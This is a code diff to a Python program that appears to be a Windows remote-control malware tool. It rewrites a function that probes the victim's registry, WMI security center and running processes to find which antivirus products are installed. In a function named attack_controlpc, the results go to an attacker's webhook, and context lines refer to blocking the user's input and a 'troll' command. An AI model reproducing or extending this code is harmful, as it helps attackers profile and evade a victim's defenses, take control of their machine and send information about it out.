@@ -15,7 +15,6 @@ import re
 import json
 from datetime import datetime
 import urllib.request
-import base64
 
 # Global variables for input blocking
 _input_blocked = False
@@ -32,176 +31,87 @@ def _get_antivirus_info():
     """Comprehensive antivirus detection"""
     av_list = []
     
-    # Common antivirus registry paths and identifiers
-    av_signatures = [
-        # Windows Defender
-        {
-            'name': 'Windows Defender',
-            'reg_paths': [
-                r"SOFTWARE\Microsoft\Windows Defender",
-                r"SOFTWARE\Microsoft\Windows Defender Advanced Threat Protection"
-            ],
-            'services': ['WinDefend', 'Sense', 'MsMpEng'],
-            'processes': ['MsMpEng.exe', 'NisSrv.exe', 'MsMpEng.exe']
-        },
-        # Malwarebytes
-        {
-            'name': 'Malwarebytes',
-            'reg_paths': [
-                r"SOFTWARE\Malwarebytes",
-                r"SOFTWARE\Malwarebytes' Anti-Malware"
-            ],
-            'services': ['MBAMService', 'MBAMChameleon'],
-            'processes': ['mbam.exe', 'MBAMService.exe']
-        },
-        # Norton
-        {
-            'name': 'Norton Security',
-            'reg_paths': [
-                r"SOFTWARE\Norton",
-                r"SOFTWARE\Symantec",
-                r"SOFTWARE\NortonSecurity"
-            ],
-            'services': ['Norton', 'Symantec', 'N360'],
-            'processes': ['ccSvcHst.exe', 'ns.exe']
-        },
-        # McAfee
-        {
-            'name': 'McAfee',
-            'reg_paths': [
-                r"SOFTWARE\McAfee",
-                r"SOFTWARE\McAfee.com"
-            ],
-            'services': ['McAfee', 'mfevtp', 'mfemms'],
-            'processes': ['mcshield.exe', 'mfefire.exe']
-        },
-        # Kaspersky
-        {
-            'name': 'Kaspersky',
-            'reg_paths': [
-                r"SOFTWARE\Kaspersky",
-                r"SOFTWARE\KasperskyLab"
-            ],
-            'services': ['AVP', 'ksde', 'klnagent'],
-            'processes': ['avp.exe', 'avpui.exe']
-        },
-        # Bitdefender
-        {
-            'name': 'Bitdefender',
-            'reg_paths': [
-                r"SOFTWARE\Bitdefender",
-                r"SOFTWARE\Bitdefender Antivirus"
-            ],
-            'services': ['Bitdefender', 'VSServ', 'bdagent'],
-            'processes': ['bdagent.exe', 'vsserv.exe']
-        },
-        # Avast
-        {
-            'name': 'Avast',
-            'reg_paths': [
-                r"SOFTWARE\Avast",
-                r"SOFTWARE\AVAST Software"
-            ],
-            'services': ['Avast', 'afwServ', 'avast'],
-            'processes': ['avastui.exe', 'afwServ.exe']
-        },
-        # AVG
-        {
-            'name': 'AVG',
-            'reg_paths': [
-                r"SOFTWARE\AVG",
-                r"SOFTWARE\AVG Technologies"
-            ],
-            'services': ['AVG', 'avg', 'avgemc'],
-            'processes': ['avgui.exe', 'avgsvc.exe']
-        },
-        # ESET
-        {
-            'name': 'ESET',
-            'reg_paths': [
-                r"SOFTWARE\ESET",
-                r"SOFTWARE\Eset"
-            ],
-            'services': ['ekrn', 'egui', 'eset'],
-            'processes': ['ekrn.exe', 'egui.exe']
-        },
-        # Trend Micro
-        {
-            'name': 'Trend Micro',
-            'reg_paths': [
-                r"SOFTWARE\TrendMicro",
-                r"SOFTWARE\Trend Micro"
-            ],
-            'services': ['Trend Micro', 'ntrtscan', 'tmccsf'],
-            'processes': ['ntrtscan.exe', 'tmccsf.exe']
-        }
-    ]
-    
-    # Check registry
-    registry_paths = [
-        winreg.HKEY_LOCAL_MACHINE,
-        winreg.HKEY_CURRENT_USER
-    ]
-    
-    for av in av_signatures:
-        detected = False
-        
-        # Check registry
-        for hive in registry_paths:
-            for reg_path in av['reg_paths']:
-                try:
-                    key = winreg.OpenKey(hive, reg_path)
-                    winreg.CloseKey(key)
-                    if av['name'] not in av_list:
-                        av_list.append(av['name'])
-                    detected = True
-                    break
-                except:
-                    pass
-            if detected:
-                break
-        
-        # Check services
-        if not detected:
-            try:
-                services = subprocess.check_output(
-                    ['sc', 'query', 'type=', 'service', 'state=', 'all'], 
-                    stderr=subprocess.DEVNULL,
-                    stdin=subprocess.DEVNULL,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                ).decode('latin-1')
-                
-                for service in av['services']:
-                    if service.lower() in services.lower():
-                        if av['name'] not in av_list:
-                            av_list.append(av['name'])
-                        detected = True
-                        break
-            except:
-                pass
-        
-        # Check processes
-        if not detected:
-            try:
-                for proc in psutil.process_iter(['name']):
-                    if any(av_proc.lower() == proc.info['name'].lower() for av_proc in av['processes']):
-                        if av['name'] not in av_list:
-                            av_list.append(av['name'])
-                        break
-            except:
-                pass
-    
-    # Check Windows Security Center for additional AV detection
+    # Check Windows Security Center
     try:
         import wmi
-        c = wmi.WMI()
-        for item in c.Win32_Product():
-            name = item.Name or ""
-            description = item.Description or ""
-            if any(term in name.lower() or term in description.lower() for term in 
-                  ['antivirus', 'security', 'endpoint', 'defender', 'protection']):
-                if name and name not in av_list:
-                    av_list.append(name)
+        c = wmi.WMI(namespace="root\\SecurityCenter2")
+        for product in c.AntiVirusProduct():
+            av_list.append(product.displayName)
+    except:
+        pass
+    
+    # Common antivirus registry paths
+    av_registry_paths = [
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Malwarebytes"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Norton"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Symantec"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\McAfee"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Kaspersky"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Bitdefender"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Avast"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\AVG"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\ESET"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TrendMicro"),
+    ]
+    
+    # AV product names to look for
+    av_names = [
+        "Windows Defender", "Malwarebytes", "Norton", "Symantec", "McAfee",
+        "Kaspersky", "Bitdefender", "Avast", "AVG", "ESET", "Trend Micro",
+        "Sophos", "Panda", "Avira", "Comodo", "Webroot", "ZoneAlarm"
+    ]
+    
+    # Check registry for AV products
+    for hive, path in av_registry_paths:
+        try:
+            key = winreg.OpenKey(hive, path)
+            for i in range(0, winreg.QueryInfoKey(key)[0]):
+                try:
+                    subkey_name = winreg.EnumKey(key, i)
+                    subkey = winreg.OpenKey(key, subkey_name)
+                    try:
+                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
+                        for av_name in av_names:
+                            if av_name.lower() in str(display_name).lower():
+                                if display_name not in av_list:
+                                    av_list.append(display_name)
+                    except:
+                        pass
+                    winreg.CloseKey(subkey)
+                except:
+                    pass
+            winreg.CloseKey(key)
+        except:
+            pass
+    
+    # Check running AV processes
+    av_processes = [
+        "MsMpEng.exe", "NisSrv.exe", "MBAMService.exe", "mbam.exe",
+        "ccSvcHst.exe", "ns.exe", "mcshield.exe", "mfefire.exe",
+        "avp.exe", "avpui.exe", "vsserv.exe", "bdagent.exe",
+        "avastui.exe", "afwServ.exe", "avgui.exe", "avgsvc.exe",
+        "ekrn.exe", "egui.exe", "ntrtscan.exe", "tmccsf.exe"
+    ]
+    
+    for proc in psutil.process_iter(['name']):
+        try:
+            if proc.info['name'].lower() in [p.lower() for p in av_processes]:
+                process_name = proc.info['name']
+                if process_name not in av_list:
+                    av_list.append(f"Running: {process_name}")
+        except:
+            pass
+    
+    # Check Windows Defender specifically
+    try:
+        defender_path = r"SOFTWARE\Microsoft\Windows Defender"
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, defender_path)
+        winreg.CloseKey(key)
+        if "Windows Defender" not in str(av_list):
+            av_list.append("Windows Defender")
     except:
         pass
     
@@ -311,7 +221,7 @@ def attack_controlpc(target, duration=60):
                 else:
                     result = "No known antivirus software detected"
                 
-                # Send to webhook instead of showing popup
+                # Send to webhook
                 _send_to_webhook(webhook_url, result)
                 
         elif command == "troll":
